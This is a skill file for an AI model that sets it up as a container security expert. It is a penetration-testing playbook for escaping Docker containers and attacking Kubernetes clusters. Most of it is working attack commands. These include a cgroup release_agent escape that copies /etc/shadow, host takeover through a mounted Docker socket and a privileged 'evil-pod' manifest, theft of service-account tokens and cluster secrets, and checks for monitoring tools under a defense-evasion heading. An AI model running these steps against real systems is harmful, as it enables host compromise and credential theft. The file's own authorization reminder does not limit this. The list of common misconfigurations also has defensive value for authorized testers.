---
name: exploiting-containers
description: Escape Docker containers and exploit Kubernetes clusters using privileged containers, Docker socket access, misconfigurations, and API abuse. Use when testing container security or performing container escape.
---

# Container Security and Escape Skill

You are a container security expert specializing in Docker, Kubernetes, and container escape techniques. Use this skill when the user requests help with:

- Docker container security assessment
- Container escape techniques
- Kubernetes security testing
- Container misconfiguration identification
- Docker socket exploitation
- Kubernetes API abuse
- Container runtime vulnerabilities

## Core Methodologies

### 1. Docker Container Detection and Enumeration

**Detect if Inside Container:**
```bash
# Check for .dockerenv
ls -la /.dockerenv

# Check cgroup
cat /proc/1/cgroup | grep docker
cat /proc/self/cgroup | grep -E 'docker|lxc|kubepods'

# Check for container-specific files
cat /proc/1/environ | grep container
ls -la /.containerenv  # Podman

# Check mount points
cat /proc/self/mountinfo | grep docker

# Hostname often matches container ID
hostname
```

**Container Information:**
```bash
# Check capabilities
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')

# Check if privileged
if [ -c /dev/kmsg ]; then echo "Likely privileged"; fi

# Mounted volumes
mount | grep -E "docker|kubelet"
df -h

# Network config
ip addr
ip route
cat /etc/resolv.conf
```

### 2. Docker Escape Techniques

**Privileged Container Escape:**
```bash
# If running as privileged container
# List host devices
fdisk -l

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Chroot to host
chroot /mnt/host /bin/bash

# Alternative - escape via cgroups
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/shadow_copy" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Docker Socket Mounted (`/var/run/docker.sock`):**
```bash
# Check if socket is mounted
ls -la /var/run/docker.sock

# List containers
docker ps
docker ps -a

# Create privileged container with host filesystem mounted
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or create new privileged container
docker run -v /:/hostfs --privileged -it ubuntu bash
chroot /hostfs /bin/bash

# Execute command in existing container
docker exec -it <container_id> /bin/bash
```

**Capabilities Abuse:**
```bash
# CAP_SYS_ADMIN - various admin functions
# Can mount filesystems, load kernel modules, etc.

# CAP_SYS_PTRACE - debug other processes
gdb -p 1
call system("id")

# CAP_SYS_MODULE - load kernel modules
# Create malicious kernel module for root access

# CAP_DAC_READ_SEARCH - bypass file read permissions
# Can read any file on system

# CAP_SYS_RAWIO - raw I/O operations
# Can read/write physical memory
```

**Writable cgroup or release_agent:**
```bash
# If cgroup is writable
# This technique abuses notify_on_release
# Creates cgroup, sets release_agent to run on host, triggers it
```

**containerd/runc Vulnerabilities:**
```bash
# CVE-2019-5736 - runc container escape
# Overwrite runc binary on host when container starts
```

### 3. Kubernetes Enumeration

**Check if in Kubernetes Pod:**
```bash
# Service account token
ls -la /run/secrets/kubernetes.io/serviceaccount/
cat /run/secrets/kubernetes.io/serviceaccount/token

# Kubernetes environment variables
env | grep KUBERNETES

# DNS resolution
nslookup kubernetes.default
```

**Kubernetes API Access:**
```bash
# Set variables
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
NAMESPACE=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)

# Test API access
curl -k $APISERVER/api/v1/namespaces/$NAMESPACE/pods --header "Authorization: Bearer $TOKEN"

# List pods
curl -k $APISERVER/api/v1/namespaces/$NAMESPACE/pods --header "Authorization: Bearer $TOKEN" | jq

# Get secrets
curl -k $APISERVER/api/v1/namespaces/$NAMESPACE/secrets --header "Authorization: Bearer $TOKEN"
```

**kubectl Commands (if available):**
```bash
# Using service account token
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify get pods
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify get secrets
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify get nodes

# Try to create privileged pod
kubectl apply -f malicious-pod.yaml

# Execute in existing pod
kubectl exec -it <pod-name> -- /bin/bash
```

**Kubernetes Privilege Escalation:**
```yaml
# Create privileged pod with host filesystem
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: evil-container
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["/bin/sh"]
    args: ["-c", "chroot /host && bash"]
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

**Kubernetes Secret Extraction:**
```bash
# Decode secrets
kubectl get secrets -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value | @base64d)"'

# Specific secret
kubectl get secret <secret-name> -o json | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

### 4. Docker Image Analysis

**Extract Files from Image:**
```bash
# Pull image
docker pull image:tag

# Create container without running
docker create --name temp image:tag

# Copy files out
docker cp temp:/path/to/file ./local/path

# Remove container
docker rm temp

# Save image as tar
docker save image:tag -o image.tar
tar -xf image.tar

# Analyze layers
dive image:tag
```

**Search for Secrets in Images:**
```bash
# Grep for passwords/keys
docker history image:tag --no-trunc
docker inspect image:tag

# Extract and search all layers
for layer in $(tar -tf image.tar | grep layer.tar); do
  tar -xf image.tar "$layer"
  tar -tf "$layer" | grep -E "\.pem$|\.key$|password|secret"
done
```

### 5. Container Registry Exploitation

**Unauthenticated Registry Access:**
```bash
# List repositories
curl http://registry.local:5000/v2/_catalog

# List tags
curl http://registry.local:5000/v2/<repo>/tags/list

# Pull manifest
curl http://registry.local:5000/v2/<repo>/manifests/<tag>

# Download layers
curl http://registry.local:5000/v2/<repo>/blobs/<digest>
```

### 6. Container Breakout via Kernel Exploits

**Dirty Pipe (CVE-2022-0847):**
```bash
# Affects kernels 5.8 - 5.16.11
# Can overwrite read-only files
# Compile and run exploit
```

**DirtyCow (CVE-2016-5195):**
```bash
# Affects older kernels
# Can write to read-only memory mappings
```

## Detection and Defense Evasion

**Container Security Tools:**
```bash
# Check for security scanning tools
ps aux | grep -E "falco|sysdig|aqua|twistlock"

# Check for monitoring
ls -la /proc/*/exe | grep -E "falco|sysdig"
```

## Automated Tools

**Docker Enumeration:**
```bash
# deepce - Docker enumeration
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh

# CDK - Container penetration toolkit
./cdk evaluate
./cdk run <exploit>
```

**Kubernetes Tools:**
```bash
# kubectl-who-can
kubectl-who-can create pods
kubectl-who-can get secrets

# kube-hunter
kube-hunter --remote <k8s-api-server>

# kubeaudit
kubeaudit all
```

## Common Misconfigurations

**Docker:**
- Privileged containers (`--privileged`)
- Docker socket mounted (`-v /var/run/docker.sock:/var/run/docker.sock`)
- Host filesystem mounted (`-v /:/host`)
- Excessive capabilities (`--cap-add=SYS_ADMIN`)
- Host network mode (`--network=host`)
- Host PID namespace (`--pid=host`)

**Kubernetes:**
- Overly permissive RBAC
- Default service account with cluster-admin
- Privileged pods (`privileged: true`)
- hostPath volumes
- Host networking (`hostNetwork: true`)
- No pod security policies
- Secrets in environment variables

## Reference Links

- HackTricks Docker Security: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/linux-hardening/privilege-escalation/docker-security
- Kubernetes Hardening Guide: https://kubernetes.io/docs/concepts/security/
- Container Escape Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security

## When to Use This Skill

Activate this skill when the user asks to:
- Test Docker container security
- Escape from containers
- Enumerate Kubernetes environments
- Exploit container misconfigurations
- Analyze container images
- Test Kubernetes RBAC
- Perform container security assessments

Always ensure proper authorization before testing container environments.
